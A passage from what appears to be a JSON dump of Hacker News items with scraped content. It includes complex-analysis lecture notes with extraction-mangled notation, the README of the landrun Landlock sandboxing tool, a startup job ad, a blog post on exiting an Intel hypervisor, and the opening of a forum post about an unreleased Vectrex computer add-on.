 = 1 for all   n , thus the radius of convergence   ρ   = 1. However, we may define an   analytic continuation   of   f   outside the range   | z |   <   1, as: ˜ f   ( z ) =   1 1   −   z  which is defined for all   z   6   = 1. So   f   is undefined for   z >   1, but for all   z <   1 we have   f   ( z ) =  ˜ f   ( z ). Consider also the exponential function: exp( z ) =   e z   :=  ∞ ∑  n =0  z n  n ! Here   a n   =   1  n !   and the radius of convergence is   ρ   =   ∞ . The coefficients of this series are exactly the same as for the real exponential function, so, because the algebraic operations on real and complex numbers obey the same rules, the exponential function defined on complex numbers obeys the same algebra as the exponential function on real numbers:  e z 1   e z 2   = e z 1 + z 2  Hence, we have  e x + iy   =   e x   cos   y   +   ie x   sin   y  once we prove that  e iy   = cos   y   +   i   sin   y  To establish the latter formula, we write  e iy   =  ∞ ∑  n =0  i n y n  n !   =  ∞ ∑  k =0  ( − 1) k y 2 k  (2 k )!   +   i  ∞ ∑  k =0  ( − 1) k y 2 k +1  (2 k   + 1)!   = cos   y   +   i   sin   y  From the formula  e iϕ   = cos   ϕ   +   i   sin   ϕ,  we see that   e iϕ   is 2 π -periodic in   ϕ :  e iφ +2 πki   =   e iϕ   for   k   ∈   Z  This periodicity implies that the inverse of the exponential function is   multi-valued : ln   ( re iϕ )   = ln   r   +   i   ( ϕ   + 2 kπ )   for   k   ∈   Z  We may use the logarithm to define arbitrary complex powers of a complex number   z :  z α   :=   e α   ln   z  This function is also multivalued (when   α   is not an integer). 4\n\n5. The previous examples are ‘good’ functions, in the sense that they are analytic, as we will see later. However, we may also define ‘bad’ functions of complex variables, such as:  f   ( z ) = Re( z )  g ( z ) =   | z |  h ( z ) =   z ∗  These functions are non-analytic. The analyticity is the main topic here. While a typical complex function is not analytic, many important functions are analytic and, as a consequence, possess non-trivial and useful properties. The analyticity can be defined in several equivalent ways. We start with the notion of the derivative.  Definition 1.1.   The   derivative   of a complex function   f   at the point   z   is given by:  f   ′ ( z ) =   lim  ∆ z → 0  f   ( z   + ∆ z )   −   f   ( z ) ∆ z   (1) Note that this limit ∆ z   →   0 may be taken in many directions; for the derivative of   f   to exist, the limit must exist and be the same regardless of the direction in which the limit is taken.   In particular, we may write ∆ z   =   re iϕ , so the limit ∆ z   →   0 must be independent of   ϕ , the direction along which ∆ z   approaches zero.  Definition 1.2.   A function   f   ( z ) is   analytic   at the point   z 0   if it has a derivative at all points close to   z 0 . Note that   f   ( z ) =   | z | 2   is not analytic at   z   = 0, even though it has a derivative at   z   = 0, because one can show that it does not have a derivative for any   z   6   = 0.  Definition 1.3.   A function   f   ( z ) is   analytic   in an open region   D   if the derivative   f   ′ ( z ) exists at every points  z   ∈   D . Let us write   f   ( z ) =   u ( x, y ) +   iv ( x, y ). In order for   f   to have a derivative at   z , the functions   u   and   v   must be differentiable at the corresponding point in the   x   −   y   plane; however, the differentiability of   u   and   v   does not guarantee the existence of   f   ′ ( z ), i.e., it is a necessary but not sufficient condition.  Theorem 1.4   (Cauchy-Riemann Conditions) .   Let   f   ( z ) =   u ( x, y ) +   iv ( x, y ) . The derivative   f   ′ ( z )   exists at  z   =   x   +   iy   if and only if   u   and   v   are differentiable and satisfy the Cauchy-Riemann equations  ∂u ∂x   =   ∂v ∂y  ,   (2a)  ∂u ∂y   =   −   ∂v ∂x  .   (2b)  Proof.   Suppose   f   ′ ( z ) exists. Then the limit in eq. (1) exists and is independent of the direction in which the limit is taken. Therefore set ∆ z   = ∆ x   and we see that:  f   ′ ( z ) =   lim  ∆ x → 0  u ( x   + ∆ x, y ) +   iv ( x   + ∆ x, y )   −   u ( x, y ) +   iv ( x, y ) ∆ x   =   ∂u ∂x   +   i  ∂v ∂x  Similarly, if we take ∆ z   =   i ∆ y   then we find:  f   ′ ( z ) =   lim  ∆ x → 0  u ( x, y   + ∆ y ) +   iv ( x, y   + ∆ y )   −   u ( x, y ) +   iv ( x, y )  i ∆ y   =   − i  ∂u ∂y   +   ∂v ∂y  5\n\nEquating the real and imaginary parts gives eq. (2). Suppose conversely that   u   and   v   satisfy eq. (2).   We keep a general form for ∆ z   = ∆ x   +   i ∆ y   and then expand:  f   ( z   + ∆ z ) = u ( x   + ∆ x, y   + ∆ y ) +   iv ( x   + ∆ x, y   + ∆ y )  u ( x   + ∆ x, y   + ∆ y ) = u ( x, y ) +   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  v ( x   + ∆ x, y   + ∆ y ) = v ( x, y ) +   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  = ⇒   f   ( z   + ∆ z )   −   f   ( z ) =   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   i  (   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y  )  +   o   ( | ∆ z | )   .  By eq. (2), the right-hand side of this formula is =  (   ∂u ∂x   +   i  ∂v ∂x  )  ∆ z   +   o   ( | ∆ z | ) and therefore   f   ′ ( z ) =   (   ∂u ∂x   +   i   ∂v ∂x  )   exists. Note the word ”differentiable” in the formulation of this theorem.   It means more than just the existence of the partial derivatives   ∂u ∂x   ,   ∂u ∂y   ,   ∂v ∂x   , and   ∂v ∂y   .   Namely, we want that   u   and   v   have derivatives along any direction (not just along the   x - and   y - axes). Or, equivalently, we want to have expansions  u ( x   + ∆ x, y   + ∆ y ) = u ( x, y ) +   ∂u ∂x   ∆ x   +   ∂u ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  v ( x   + ∆ x, y   + ∆ y ) = v ( x, y ) +   ∂v ∂x   ∆ x   +   ∂v ∂y   ∆ y   +   o  (√ ∆ x 2   + ∆ y 2  )  A sufficient condition for that is the continuity of   ∂u ∂x   ,   ∂u ∂y   ,   ∂v ∂x   , and   ∂v ∂y   . Thus, an equivalent definition of analyticity is this: the function is analytic in an open region   D   of the complex plane if its real and imaginary parts are differentiable and satisfy Cauchy-Riemann conditions at every point of   D . 6\n\n2   Lecture 2: Derivatives and integrals  2.1   Derivatives and integrals, Cauchy theorem  We repeat that a function   f   ( z ) is   analytic   (or holomorphic) at the point   z 0   if it has a derivative at all points  z   close to   z 0 . The derivative of   f   is defined like in the real case:  f   ′ ( z ) =   lim  ∆ z → 0  f   ( z   + ∆ z )   −   f   ( z ) ∆ z   ,  which is independent of the direction along which ∆ z   →   0. This independence condition is equivalent to the Cauchy-Riemann condition, i.e. letting   f   =   u   +   iv , we have  ∂u ∂x   =   ∂v ∂y  ,   ∂u ∂y   =   −   ∂v ∂x  .  The derivative satisfies the same rules as in the real case: for any analytic functions   f   and   g , we have 1. ( f   +   g ) ′   =   f   ′   +   g ′ , 2. ( f g ) ′   =   f   ′ g   +   f g ′ , 3. (   f g   ) ′   =   f   ′ g − f g ′  g 2   , 4. (chain rule) for any   z   in the domain of   g , ( f   ( g ( z ))) ′   =   f   ′ ( g ( z )) g ′ ( z ).  Remark   If   g   is the inverse of   f   , i.e. for any   z   in the domain of   f   ,   g ( f   ( z )) =   z , then   g ′ ( f   ( z )) =   1  f   ′ ( z )   , and  g ′ ( z ) =   1  f   ′ ( g ( z ))   . Some examples of how to derive the derivatives are given in what follows.  Example   i. Suppose   f   ( z ) =   c   for any   z   ∈   C , where   c   is a constant complex number.   Since for any  z,   ∆ z   ∈   C  f   ( z ) + ∆ z   −   f   ( z ) ∆ z   =   c   −   c  ∆ z   = 0 ,  the derivative of   f   is 0. ii. Suppose   f   ( z ) =   z   for any   z   ∈   C . Since for any   z,   ∆ z   ∈   C ,  f   ( z ) + ∆ z   −   f   ( z ) ∆ z   =   z   + ∆ z   −   z  ∆ z   = 1 ,  we get   f   ′ ( z ) = 1. iii. Using the product rule, for any   z   ∈   C , we get ( z n ) ′   =   nz n − 1  iv. Now, for any   z   ∈   C , letting   P   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n , we get the derivative of   P   as follows:  P   ′ ( z ) =   a 1   +   ...   +   na n z n − 1 .  v. Since any rational function can be written as   P Q   , where   P   and   Q   are polynomials, and since (   P Q   ) ′   =  P   ′ Q − P Q ′  Q 2   , we obtain that rational functions are analytic everywhere except for the points where   Q ( z ) = 0. 7\n\nvi. Suppose   f   is a power series, i.e.   f   ( z ) =   a 0   +   a 1 z   +   ...   +   a n z n   +   ... , then  f   ′ ( z ) =   a 1   + 2 a 2 z   +   ...   +   a n z n − 1   +   ...  Furthermore, given that   | a n | ≤   cρ − n , which implies that  | na n | ≤   (   cn ρ   ) ρ − ( n − 1)   ≤   ˜ c ˜ ρ − ( n − 1) ,   where ˜ ρ < ρ,   and ˜ c   large enough ,  we conclude that   f   ′   has the same radius convergence as that of   f   . Example. For   e z   =   ∑ ∞  i =0   z n  n !   , its derivative is ( e z   ) ′   = 1 +   z   +   ...   +   nz n − 1  n !   +   ...   =  ∞ ∑  i =0  z n  n !  =   e z   .  The inverse function of   e z   is denotes as ln   z   (recall that ln( re iψ   ) = ln   r   +   i ( ψ   + 2 kπ )). Using the rule for the derivative of the inverse function, we find (ln   z ) ′   =   1  e ln   z   =  1  z  .  vii. For any   α   ∈   R   and   z   ∈   C , ( z α ) ′   = ( e α   ln   z   ) ′   =   α z  e α   ln   z   =   αz α − 1 .  viii. Letting   ζ   be a Riemann Zeta function, i.e.   ζ ( z ) =   ∑ ∞  n =1   n − z   , then its derivative is:  ζ ′ ( z ) =   −  ∞ ∑  n =1  n − z   (ln   n ) .  Holomorphic functions have many wonderful, or even magical properties. For example, let   D   be a simply connected open region in   C , as in Figure 4.  Figure 4: A simply connected region   D .  Then, as we will show later, the following two statements are equivalent for a complex function   f   defined in  D : (a)   f   ′ ( z ) exists for all   z   in the domain   D , (b)   ∫   z z 0   f   ( ξ ) dξ   exists for all   z   and   z 0   in the domain   D . 8\n\nIt is indeed, unexpected: we know that for real functions of a real variable the existence of the derivative does not follow from the existence of the integral. Moreover, property (b) implies, in fact, that for any   z   ∈ D ,  f   ( z ) =   1 2 πi  ∫  γ  f   ( ξ )  ξ   −   z  dξ.   (3) This is   Cauchy formula , which plays the central role in this theory (here   γ   is the boundary of   D ; we move along   γ   anti-clockwise). We will explain the notion of the integral along the path   γ   in a moment.   Before that, we just note that this is indeed a magical formula: the values of the analytic function   f   at any point inside the domain   D   are determined by the values of   f   on the boundary of the domain only! Magical formulas have magical consequences: using the Cauchy formula, we will also show later that   f   has derivatives of   all orders   and the Taylor series of   f   converges to   f   . Nothing similar happens for real functions of a real variable, they may have first derivative, but not second derivative, or first and second derivative, but no third derivative, etc; or derivatives of all orders may exist, but the Taylor series may diverge, or converge to a wrong function - all these complications disappear for complex-valued functions of complex variables. In order to properly formulate these results, we need to introduce the notion of an integral over a path in the complex plane. Let   γ   :=   { z   =   z ( t ) |   t   ∈   [0 ,   1] }   be a continuous curve parameterized by a real parameter  t . Figure 5 shows a path connecting points   z (0) and   z (1).  Figure 5: A path   γ   in   D .  We define the integral over   γ   as:  ∫  γ  f   ( z ) dz   =   lim  n →∞  n − 1 ∑  k =0  f   ( z ( t k ))( z ( t k +1 )   −   z ( t k ) .   (4) Here   { t 0   = 0 , t 1 , ..., t n   = 1 }   is any partition of [0 ,   1] such that   t k +1   −   t k   tends uniformly to zero as   n   →   + ∞ . The main (and the simplest) example is when   t k   =   k n   .  Remark   It is important to remember that ( z ( t k +1 )   −   z ( t k )) in (4) is a complex number, not the length  | z ( t k +1 )   −   z ( t k ) | . The path   γ   is smooth when the function   z ( t ) is smooth (i.e., continuously differentiable). In this case, one uses the following formula for the computation of the integral:  ∫  γ  f   ( z ) dz   =  ∫   1 0  f   ( z ( t )) z ′ ( t ) dt.  9\n\nThe integral has the following basic properties. 1. If ˜ γ   is the same curve as   γ , just with opposite orientation, (i.e. ˜ z ( t ) =   z (1   −   t )), then  ∫  γ  f   ( z ) dz   =   −  ∫  ˜ γ  f   ( z ) dz.  2. Let the end point of   γ 1   be the starting point of   γ 2 . Then  ∫  γ 1 ∪ γ 2  f   ( z ) dz   =  ∫  γ 1  f   ( z ) dz   +  ∫  γ 2  f   ( z ) dz.  Note that Property 1 together with Property 2 implies that if   γ   =   γ 1   ∪   γ 2   where   γ 2   is the same path as   γ 1  just with opposite orientation (i.e.,   γ   is a closed path obtained by traversing the same arc twice, forwards and then backwards), then   ∫  γ   f   ( z ) dz   = 0. We note that the integral over a path   γ   is well-defined for any continuous function   f   , which does not need to be analytic. However, we will show in the next lecture that for analytic functions the integral   ∫  γ   f   ( z ) dz   does not change when we slightly deform   γ   without moving the end points, so we can write   ∫   z 1  z 0   f   ( ζ ) dζ   without indicating the path connecting the points   z 0   and   z 1 . 10",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3f8268237786294b",
    "title": {
      "en": "The polar vortex is hitting the brakes",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-hitting-brakes",
    "score": 174,
    "by": "bryanrasmussen",
    "time": 1742671898,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "99e9a4ff0d6d0812",
    "title": {
      "en": "Landrun: Sandbox any Linux process using Landlock, no root or containers",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/Zouuup/landrun",
    "score": 253,
    "by": "Zoup",
    "time": 1742651819,
    "content": "landrun\nA lightweight, secure sandbox for running Linux processes using Landlock LSM. Think firejail, but with kernel-level security and minimal overhead.\nFeatures\n\n🔒 Kernel-level security using Landlock LSM\n🚀 Lightweight and fast execution\n🛡️ Fine-grained access control for directories\n🔄 Support for read and write paths\n⚡ Path-specific execution permissions\n🌐 TCP network access control (binding and connecting)\n\nDemo\n\nRequirements\n\nLinux kernel 5.13 or later with Landlock LSM enabled\nLinux kernel 6.8 or later for network restrictions (TCP bind/connect)\nGo 1.18 or later (for building from source)\n\nInstallation\nQuick Install\ngo install github.com/zouuup/landrun/cmd/landrun@latest\n\nFrom Source\ngit clone https://github.com/zouuup/landrun.git\ncd landrun\ngo build -o landrun cmd/landrun/main.go\nsudo cp landrun /usr/local/bin/\n\nUsage\nBasic syntax:\nlandrun [options] <command> [args...]\n\nOptions\n\n--ro <path>: Allow read-only access to specified path (can be specified multiple times or as comma-separated values)\n--rox <path>: Allow read-only access with execution to specified path (can be specified multiple times or as comma-separated values)\n--rw <path>: Allow read-write access to specified path (can be specified multiple times or as comma-separated values)\n--rwx <path>: Allow read-write access with execution to specified path (can be specified multiple times or as comma-separated values)\n--bind-tcp <port>: Allow binding to specified TCP port (can be specified multiple times or as comma-separated values)\n--connect-tcp <port>: Allow connecting to specified TCP port (can be specified multiple times or as comma-separated values)\n--best-effort: Use best effort mode, falling back to less restrictive sandbox if necessary [default: enabled]\n--log-level <level>: Set logging level (error, info, debug) [default: \"error\"]\n\nImportant Notes\n\nYou must explicitly add the path to the command you want to run with either --ro or --rox flag\nFor system commands, you typically need to include /usr/bin, /usr/lib, and other system directories\nUse --rox for directories containing executables you need to run\nUse --rwx for directories where you need both write access and the ability to execute files\nNetwork restrictions require Linux kernel 6.8 or later with Landlock ABI v5\nThe --best-effort flag allows graceful degradation on older kernels that don't support all requested restrictions\nPaths can be specified either using multiple flags or as comma-separated values (e.g., --ro /usr,/lib,/home)\n\nEnvironment Variables\n\nLANDRUN_LOG_LEVEL: Set logging level (error, info, debug)\n\nExamples\n\nRun a command with read-only access to a directory:\n\nlandrun --rox /usr/ --ro /path/to/dir ls /path/to/dir\n\nRun a command with write access to a directory:\n\nlandrun --rox /usr/bin --ro /lib --rw /path/to/dir touch /path/to/dir/newfile\n\nRun a command with execution permissions:\n\nlandrun --rox /usr/ --ro /lib,/lib64 /usr/bin/bash\n\nRun with debug logging:\n\nlandrun --log-level debug --rox /usr/ --ro /lib,/lib64,/path/to/dir ls /path/to/dir\n\nRun with network restrictions:\n\nlandrun --rox /usr/ --ro /lib,/lib64 --bind-tcp 8080 --connect-tcp 80 /usr/bin/my-server\n\nThis will allow the program to only bind to TCP port 8080 and connect to TCP port 80.\n\nRun a DNS client with appropriate permissions:\n\nlandrun --log-level debug --ro /etc,/usr --rox /usr/ --connect-tcp 443 nc kernel.org 443\n\nThis allows connections to port 443, requires access to /etc/resolv.conf for resolving DNS.\n\nRun a web server with selective network permissions:\n\nlandrun --rox /usr/bin --ro /lib,/lib64,/var/www --rwx /var/log --bind-tcp 80,443 /usr/bin/nginx\n\nRunning anything without providing paramneters is... maximum security jail!\n\nlandrun ls\n\nIf you keep getting permission denied without knowing what exactly going on, best to use strace with it.\n\nlandrun --rox /usr strace -f -e trace=all ls\n\nSecurity\nlandrun uses Linux's Landlock LSM to create a secure sandbox environment. It provides:\n\nFile system access control\nDirectory access restrictions\nExecution control\nTCP network restrictions\nProcess isolation\n\nLandlock is an access-control system that enables processes to securely restrict themselves and their future children. As a stackable Linux Security Module (LSM), it creates additional security layers on top of existing system-wide access controls, helping to mitigate security impacts from bugs or malicious behavior in applications.\nLandlock Access Control Rights\nlandrun leverages Landlock's fine-grained access control mechanisms, which include:\nFile-specific rights:\n\nExecute files (LANDLOCK_ACCESS_FS_EXECUTE)\nWrite to files (LANDLOCK_ACCESS_FS_WRITE_FILE)\nRead files (LANDLOCK_ACCESS_FS_READ_FILE)\nTruncate files (LANDLOCK_ACCESS_FS_TRUNCATE) - Available since Landlock ABI v3\n\nDirectory-specific rights:\n\nRead directory contents (LANDLOCK_ACCESS_FS_READ_DIR)\nRemove directories (LANDLOCK_ACCESS_FS_REMOVE_DIR)\nRemove files (LANDLOCK_ACCESS_FS_REMOVE_FILE)\nCreate various filesystem objects (char devices, directories, regular files, sockets, etc.)\nRefer/reparent files across directories (LANDLOCK_ACCESS_FS_REFER) - Available since Landlock ABI v2\n\nNetwork-specific rights (requires Linux 6.8+ with Landlock ABI v5):\n\nBind to specific TCP ports (LANDLOCK_ACCESS_NET_BIND_TCP)\nConnect to specific TCP ports (LANDLOCK_ACCESS_NET_CONNECT_TCP)\n\nLimitations\n\nLandlock must be supported by your kernel\nNetwork restrictions require Linux kernel 6.8+ with Landlock ABI v5\nSome operations may require additional permissions\nFiles or directories opened before sandboxing are not subject to Landlock restrictions\n\nKernel Compatibility Table\n\nFeature\nMinimum Kernel Version\nLandlock ABI Version\n\nBasic filesystem sandboxing\n5.13\n1\n\nFile referring/reparenting control\n5.17\n2\n\nFile truncation control\n6.1\n3\n\nNetwork TCP restrictions\n6.8\n5\n\nTroubleshooting\nIf you receive \"permission denied\" or similar errors:\n\nEnsure you've added all necessary paths with --ro or --rw\nTry running with --log-level debug to see detailed permission information\nCheck that Landlock is supported and enabled on your system:\ngrep -E 'landlock|lsm=' /boot/config-$(uname -r)\n\nYou should see CONFIG_SECURITY_LANDLOCK=y and lsm=landlock,... in the output\nFor network restrictions, verify your kernel version is 6.8+ with Landlock ABI v5:\nuname -r\n\nTechnical Details\nImplementation\nThis project uses the landlock-lsm/go-landlock package for sandboxing, which provides both filesystem and network restrictions. The current implementation (v0.1.3) supports:\n\nRead/write/execute restrictions for files and directories\nTCP port binding restrictions\nTCP port connection restrictions\nBest-effort mode for graceful degradation on older kernels\n\nBest-Effort Mode\nWhen using --best-effort (disabled by default), landrun will gracefully degrade to using the best available Landlock version on the current kernel. This means:\n\nOn Linux 6.8+: Full filesystem and network restrictions\nOn Linux 6.1-6.7: Filesystem restrictions including truncation, but no network restrictions\nOn Linux 5.17-6.0: Basic filesystem restrictions including file reparenting, but no truncation control or network restrictions\nOn Linux 5.13-5.16: Basic filesystem restrictions without file reparenting, truncation control, or network restrictions\nOn older Linux: No restrictions (sandbox disabled)\n\nFuture Features\nBased on the Linux Landlock API capabilities, we plan to add:\n\n🔒 Enhanced filesystem controls with more fine-grained permissions\n🌐 Support for UDP and other network protocol restrictions (when supported by Linux kernel)\n🔄 Process scoping and resource controls\n🛡️ Additional security features as they become available in the Landlock API\n\nLicense\nThis project is licensed under the GNU General Public License v2\nContributing\nContributions are welcome! Please feel free to submit a Pull Request.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "f0278c8dffc99c32",
    "title": {
      "en": "Through a Glass Lushly: Michalina Janoszanka's Reverse Paintings (Ca. 1920s)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://publicdomainreview.org/collection/michalina-janoszanka/",
    "score": 15,
    "by": "prismatic",
    "time": 1742418939,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "358527fe6882b6b9",
    "title": {
      "en": "Domu Technology Inc. (YC S24) Is Hiring a Vibe Coder",
      "ko": null,
      "ja": null
    },
    "type": "job",
    "url": "https://www.ycombinator.com/companies/domu-technology-inc/jobs/hwWsGdU-vibe-coder-ai-engineer",
    "score": 1,
    "by": "Nicoding27",
    "time": 1742691612,
    "content": "Domu Technology Inc.Automating debt collection calls for banks.Vibe Coder - AI Engineer $80K - $120K / 0.10% - 1.00%LocationSan Francisco, CA, USJob TypeFull-timeExperience3+ yearsConnect directly with founders of the best YC-fundedstartups.Apply to role ›Camila ZancanellaFounderAbout the roleAbout Us:\nDomu is an enterprise voice AI startup crushing it in the financial services industry. We’ve tripled (ARR) with Fortune 500 customers and are on track to dominate the industry. Now, 50% of our code is written by AI, so we are a small engineering team. Putting in 12 to 15-hour days, the engineering team has traveled to +10 cities in the past half-year for product launches.\n\nWhat you will be doing:\n\nWe ship new features for our product daily.\nSolve deep product problems like how to collect more money with a voice AI agent.\nFigure out how to scale our infrastructure to handle millions of monthly calls.\nOnboard customers, talk to them and travel to visit them.\nStress test AI agents.\nYour onboarding will be making collection calls.\n\nRequirements:\nAt least 50% of the code you write right now should be done by AI; Vibe coding experience is non-negotiable.\nWork in-person in SF\n+3 years of experience.\nTrack record of shipping scalable products to end users\nReady to grind long hours, including weekends, to hit our ambitious goals.\nWilling to travel frequently to meet clients where they are.\nDown to do whatever it takes, including direct client interactions.\nWhat’s In It For You:\nEvery team member gets equity, and your compensation scales with our revenue, so your hustle directly impacts your earnings. You will be building tech that millions will use, including the world’s biggest banks and insurance companies, which will rely on your creations.\n\nWe will take you to all the office hours with some of the best voice AI builders in the world right now.\nAbout Domu Technology Inc.Domu Technology Inc.Founded:2024Team Size:6Status:ActiveLocation:San FranciscoFoundersNick DiazFounderCamila ZancanellaFounderSimilar JobsborongFull-Stack Developer InferBackend focused Full-Stack Engineer (Founding Team)HotplateFullstack EngineerInfisicalSenior Full Stack Engineer (US)Firstbase.ioSenior Back End Engineer - GolangSimCare AIFounding EngineerMethod FinancialEngineering Manager Dots 💸Generalist EngineerSapling.aiFullstack EngineerTellaSenior Product Engineer (Frontend)FintoolFounding LLM Data EngineerPylonSenior Software EngineerAtlasSoftware EngineerVantaSenior Software EngineerFernDeployed EngineerHeron DataSoftware EngineerDoorDashSoftware Engineer, Site Reliability (SRE)CoastDesign Engineer, ProductFractionalProduct EngineerLuminaiDeployment Engineer",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "1e51268ed4d16a02",
    "title": {
      "en": "Quitting an Intel x86 Hypervisor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://halobates.de/blog/p/446",
    "score": 44,
    "by": "todsacerdoti",
    "time": 1742676124,
    "content": "Quitting an Intel x86 hypervisor\nwithout comments\n\nThis is an esoteric topic that might be of interest to people implementing Intel hypervisors. It assumes you know the basics of the Intel virtualization architecture, see Hypervisor from scratch for a tutorial. The actual full VT architecture is described in Volume 3 of the Intel SDMLet’s say we write an x86 hypervisor that starts in the UEFI environment and virtualizes the the initialization phase of an OS. But the hypervisor wants to quit eventually to not  cause extra overhead during OS run time.The way the hypervisor works is that it runs in its own memory and with its own page tables which are switched atomically on every VM exit by the VT-x implementation. This way it is isolated from the main OS.At some exit with the hypervisor running in its own context it decides that it is not needed anymore and wants to quit. To disable VT support the VMXOFF instruction can be used. But what we really need is an atomic VMXOFF + switch to the original OS page plus a jump, and all that without using any registers which need to be already restored to the original state of the OS. One trick is to use the MOV to CR3 instruction that reloads the page table as a jump. As soon as the page table is reloaded the CPU will fetch the next instruction with the translations from the freshly loaded page table, so we can transfer execution to the guest context. However to do that the MOV CR3 needs to be just before the page offset of the target instruction. This can be done by copying a trampoline to the right page offset (potentially overlapping into the previous page). The trampoline is located in a special transfer page table mapping that places writable code pages overlapping the target mapping.But there are some complications. The hypervisor also needs to load the segmentation state (like GDT/LDT) of the guest. In theory they could just be loaded by mapping these guest pages into the transfer mapping and loading them before the transfer.  But what happens if the GDT/LDT is on the same page as the target address (this is common in real OS’ assembler startup code which is a small assembler file without any page separation between code and data). One option would be to copy them to the transfer page too and load it there, or the hypervisor first copies them to a temporary buffer and loads it from there. In the second option the base addresses of these structures will be incorrect, but in practice you can often rely on them getting reloaded eventually anyways.Another problem is the register state of the target. MOV to CR3 needs a register as the source of the reload, and it needs to be the last instruction of the trampoline. So it is impossible to restore the register it uses. But remember the hypervisor is doing this as the result of a exit. If we chose an exit for a condition that already clobbers a register we can use the same register for the reload and the next instruction executed in the original guest (and which caused the exit originally) will just overwrite it again.\n\nA very convenient instruction for this is CPUID. It is executed multiple times in OS startup and clobbers multiple registers. In fact VMX always intercepts CPUID so it has to handle these exits in any case. So the trick to quit an hypervisor is to wait for the next CPUID exit and then use one of the registers clobbered by CPUID for the final CR3 reload.  This will have inconsistent register state for one instruction in the target, but unless the original OS is currently running a debugger it will never notice. In principle any exit as a result of an instruction that clobbers a register can be used for this.There is another potential complication if the target address of the OS conflicts with where the hypervisor is running before entering the transfer mapping. This could be solved with a third auxiliary mapping that is used before jumping to the transfer trampoline. In practice it doesn’t seem to be a problem because x86 OS typically run in a 1:1 mapping for startup, and that cannot conflict with the 1:1 mapping used by  UEFI programs as our hypervisor.\n\nHappy hypervisor hacking!\n\n    Written by therapsid\n    March 18th, 2025 at 9:34 pm\n\n    Posted in curiosities,kernel\n\n    « The browser circle closes again\n\nLeave a Reply\n\nName\n\nMail (will not be published)\n\nWebsite\n\nΔdocument.getElementById( \"ak_js_1\" ).setAttribute( \"value\", ( new Date() ).getTime() );",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2bfa44bc1d84798a",
    "title": {
      "en": "Trapping misbehaving bots in an AI Labyrinth",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://blog.cloudflare.com/ai-labyrinth/",
    "score": 114,
    "by": "pabs3",
    "time": 1742391067,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d0bcffad54b657d9",
    "title": {
      "en": "Differential Geometry: A First Course in Curves and Surfaces [pdf]",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://math.franklin.uga.edu/sites/default/files/users/user317/ShifrinDiffGeo.pdf",
    "score": 113,
    "by": "ibobev",
    "time": 1742651190,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "27b2b887ce228a79",
    "title": {
      "en": "Magical Instant Bullets",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://militaryrealism.blog/2025/03/20/magical-instant-bullets/",
    "score": 36,
    "by": "baud147258",
    "time": 1742507720,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "af6f19d8a0fd65d6",
    "title": {
      "en": "300-year-old Polish beech voted Tree of the Year",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.bbc.co.uk/news/articles/c20dd6yk55yo",
    "score": 41,
    "by": "n1b0m",
    "time": 1742416678,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "11859a6c056f214a",
    "title": {
      "en": "The Vectrex Computer",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.amigalove.com/viewtopic.php?t=2887",
    "score": 39,
    "by": "erickhill",
    "time": 1742683941,
    "content": "If you're a Vectrex fan, be prepared to mourn what never came to be…\n\nSince I have nothing better to do as I get over an annoying head cold, I've been lying in bed today downloading every issue of Electronic Games magazine and converting each one into OCR searchable text. For decades I've had this nagging memory of a Vectrex computer announcement that never made it to production, and I was convinced it was from that publication. I owned a Vectrex at the time and would scour the game magazines for any tiny shred of news they might provide about my system. To their credit they seemed to bend over backwards to mention when a new Vectrex game hit store shelves, it just didn't happen that often enough for the Vectrex. I was usually lucky to find a couple inches of text per issue, and these were over 100 pages long each month.\n\nBut I remember reading about this supposed computer \"add-on\" and that the article was actually more than just a blurb and had some images. I never forgot about it. But, all these decades later I was never able to find that announcement. Every few years I'd look around and give up. I honestly started to wonder recently if I'd invented the memory.\n\nSome of the magazine scans on Archive.org are giant unsearchable image-based PDFs so not even Google could see inside them. So, today I started to download issues one at a time, convert them to 600 dpi for OCR scanning in Adobe Acrobat and started searching for \"vectrex\". Over, and over, and over. Amazing what illness can spawn sometimes.\n\nAfter a few hours I FOUND IT. AFTER ALL THESE YEARS!!!\n\nBehold (in text) - the mythological Vectrex Computer. Supposedly it even had 5 titles ready to ship in early 1984!\n\n\t\t\tBoth the light pen and goggles mentioned in the article were in fact produced and sold for a brief time.\n\nSince not everyone can see images, here is the text that matters from the article:\n\nBelieve it or not, the Vectrex stand-alone unit can now be transformed into a home computer!\nWith the assistance of a new keyboard developed by General Consumer Electronics, the plug-in adds 16K ROM and 16K RAM to the unit, and even incorporates a 65-key typewriter-style keyboard. Software for the computer is made on wafer-tapes, providing for 128K bytes of storage. BASIC's built into the system, and the keyboard is just the first step toward a word processor that'll be introduced in early 1984.\n\nFive cartridges for the 1983 computer include:\nThe Sound Studio, a music composition aid\nExploring the Solar System\nCreate-A-Game/Maze, which teaches the user to program his very own 